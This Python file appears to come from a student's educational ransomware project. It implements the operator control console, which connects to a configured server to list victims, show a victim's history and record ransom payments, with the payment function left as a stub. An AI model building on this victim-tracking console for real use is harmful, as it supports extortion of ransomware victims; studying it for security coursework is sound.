# --------------------------------------------

# Ransomware Project for educational purposes
# Course : Security integration
# Bloc : 1
# Group : IS4
# Class : main

# --------------------------------------------
import socket
from utile import security
import utile.configgetter as config
from utile import message

def main():
    """ Console de contrôle """
    # Key server start

    # Initialisation de la sécurité
    sec = security.SecurityLayer();

    print('CONSOLE DE CONTRÔLE'
          '\n==================='
          '\n1) Liste des victimes du ransomware'
          '\n2) Historique des états d''une victime'
          '\n3) Renseigner le paiement de rançon d''une victime'
          '\n4) Quitter')
    # Création de la socket de connexion
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # On se connecte
    s.connect((config.get_ip("../config.json"), config.get_port("../config.json")))
    # 19 ainsi il est initalisé à une variable impossible à atteindre
    choix = "19"
    # hasAsked 1 Before = Check si il a demander un listing avant
    # de vouloir check un historique.
    hasAsked = False
    get_keys = s.recv(2048)
    print('$ Server : ' + str(get_keys))
    while choix != '4':
        # On demande un choix plus cohérent basé sur le menu plus haut
        choix = input('Votre choix : ')
        if choix == '1':
            hasAsked = True
            # On demande au serveur frontale de lister les victimes
            # Lui va interroger la DB Sqlite
            d = message.list_victim_req()
            s.send(bytes(d, 'utf-8'))
            # On récupère la réponse en écoutant
            data = s.recv(2048)
            # Et on l'envoie...
            print('$ Server : ' + str(data))
        elif choix == '2':
            if hasAsked:
                # On demande au serveur frontale l'historique d'une victime
                # On construit un input pour demander à l'utilisateur l'ID
                id = input('Merci de préciser un ID pour consulter l''historique : ')
                # On transmet l'ID au serveur frontale
                d = message.history_req(id)
                s.send(bytes(str(d), 'utf-8'))
                # On écoute la réponse
                data_h = s.recv(2048).decode()
                # On reçoit l'historique...
                print('$ Server : ' + str(data_h))
            else:
                print("ERREUR : Veuillez d'abord lister les victimes!")
        elif choix == '3':
            # Todo Fill payload
            # C'est à faire
            print(fill_payload())
        elif choix == '4':
            # On ferme la connexion et quitte la console de contrôle
            # On prévient le serveur qu'on ferme la connexion avant de la fermer
            # Afin de garder des traces (logs)
            s.send(bytes(message.close_connexion(), 'utf-8'))
            data = s.recv(2048).decode()
            print('$ Server : ' + str(data))
            # On break et la connexion se ferme en sortant du break
            break
    s.close()

def fill_payload():
    return 'Todo payload'

if __name__ == '__main__':
    main()
